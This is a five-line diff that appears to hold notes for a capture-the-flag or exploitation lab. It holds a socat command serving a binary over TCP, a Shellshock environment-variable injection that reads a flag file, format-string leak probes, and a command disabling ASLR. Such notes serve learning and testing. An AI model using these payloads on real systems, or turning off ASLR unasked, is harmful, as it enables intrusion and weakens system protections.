@@ -1,0 +1,5 @@
+socat TCP-LISTEN:8080,reuseaddr,fork EXEC:./a.out
+env x='() { :;}; /bin/cat ./flag' ./shellshock
+AAAA,%7$p
+AAAA,%7$s
+sudo sysctl -w kernel.randomize_va_space=0
